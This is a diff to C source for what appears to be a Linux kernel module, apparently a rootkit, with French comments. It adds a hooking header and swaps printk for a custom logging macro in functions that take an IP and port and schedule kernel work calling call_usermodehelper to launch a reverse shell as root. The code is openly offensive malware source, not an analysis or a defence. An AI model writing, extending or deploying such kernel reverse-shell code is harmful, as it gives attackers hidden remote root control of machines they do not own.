@@ -1,4 +1,5 @@
 #include "revshell.h"
+#include "hooking.h"
 
 #define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
 #define HOME "HOME=/root"
@@ -40,12 +41,12 @@ void execute_reverse_shell(struct work_struct *work) {
     };
 
     // Impression pour le débogage
-    printk(KERN_INFO ":: Starting reverse shell %s\n", exec);
+    m_printd(KERN_INFO ":: Starting reverse shell %s\n", exec);
 
     // Exécution de la commande en mode utilisateur
     int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if (err < 0) {
-        printk(KERN_INFO ":: Error executing usermodehelper.\n");
+        m_printd(KERN_INFO ":: Error executing usermodehelper.\n");
     }
 
     // Libération de la mémoire allouée
@@ -62,17 +63,17 @@ int start_reverse_shell(char* ip, char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
     if(!params){
-        printk(KERN_INFO ":: Error allocating memory\n");
+        m_printd(KERN_INFO ":: Error allocating memory\n");
         return 1;
     }
     params->target_ip = kstrdup(ip, GFP_KERNEL);
     params->target_port = kstrdup(port, GFP_KERNEL);
-    printk(KERN_INFO "Loading work\n");
+    m_printd(KERN_INFO "Loading work\n");
     INIT_WORK(&params->work, &execute_reverse_shell);
 
     err = schedule_work(&params->work);
     if(err<0){
-        printk(KERN_INFO ":: Error scheduling work of starting shell\n");
+        m_printd(KERN_INFO ":: Error scheduling work of starting shell\n");
     }
     return err;
 
